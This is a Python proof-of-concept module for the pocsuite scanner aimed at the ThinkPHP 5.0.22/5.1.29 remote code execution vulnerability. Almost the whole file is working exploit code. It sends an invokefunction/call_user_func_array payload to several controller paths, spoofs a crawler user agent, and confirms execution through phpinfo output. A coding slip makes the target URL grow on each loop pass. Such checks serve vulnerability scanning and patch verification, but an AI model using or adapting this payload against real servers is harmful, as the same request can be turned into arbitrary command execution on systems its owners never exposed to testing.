#!/usr/bin/python
# -*- coding: utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

def send_command(url):
    try:
        httpreq = req.Session()
        headers = {'Content-Type': 'application/x-www-form-urlencoded',
                   'User-Agent': 'GoogleSpider'
                   }
        resp = httpreq.get(url, headers=headers)
        con = re.search('\<title\>phpinfo\(\)\</title\>', resp.text)
        if con:
            return True
    except Exception as ex:
        resp = None

class TestPOC(POCBase):
    name = 'Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability'
    vulID = ''
    author = ['']
    vulType = 'cmd-exec'
    version = '1.0'
    references = ['']
    desc = '''ThinkPHP is an extremely widely used PHP development 
    framework in China. In its version 5, as the framework processes 
    controller name incorrectly, it can execute any method if the 
    website doesn't have mandatory routing enabled (which is default), resulting in a RCE vulnerability.'''

    vulDate = ''
    createDate = '2019-03-17'
    updateDate = ''

    appName = 'thinkphp'
    appVersion = '5.0.22'
    appPowerLink = 'https://www.thinkphp.cn'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        return self._verify()

    def _verify(self):
        """verify mode"""
        connect = ['index','home','admin']
        result = {}
        payload1 = '/index.php?s=/'
        payload2 = '/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
        for i in connect:
            self.url = self.url + payload1 + i + payload2
            resp = send_command(self.url)
            #result['extra']['evidence'] = self.url
            #result['extra'][i + 'url'] = self.url
            time.sleep(2)
            if resp:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

